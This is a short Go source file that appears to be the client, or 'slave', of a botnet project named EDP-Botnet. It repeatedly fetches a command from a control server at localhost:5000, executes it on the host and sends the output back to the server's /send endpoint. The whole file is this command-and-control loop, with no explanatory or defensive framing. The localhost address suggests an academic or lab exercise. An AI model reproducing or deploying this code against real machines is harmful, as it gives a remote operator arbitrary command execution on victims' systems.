package main

import (
	"github.com/grisufrj/EDP-Botnet/ExecutingSlave"
)

func main() {
	url := "http://localhost:5000"
	comando := ExecutingSlave.Recv_cmd(url + "/command")
	resp := ExecutingSlave.Exec_cmd(comando)
	ExecutingSlave.Send_cmd(url+"/send", resp)

}
